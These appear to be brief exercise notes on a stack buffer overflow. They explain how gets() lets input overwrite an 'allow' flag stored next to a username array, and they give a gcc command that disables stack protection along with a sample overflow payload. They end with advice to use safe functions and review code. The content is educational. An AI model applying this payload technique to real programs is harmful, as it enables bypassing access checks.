#gets is an unsecure option that does not checks input compiability 
allow is located immidiately after username array
but overflowing input and modularing the last 4 bits of an integer we can change allow's value

#compile disabling stack protection:
gcc -o  exec_1.c -fno-stack-protector -z execstack

#input while controlling last bits
AAAAAAAA\x01\x00\x00\x00



#to fix it
work with safe functions

#to find exploit
review the code before release
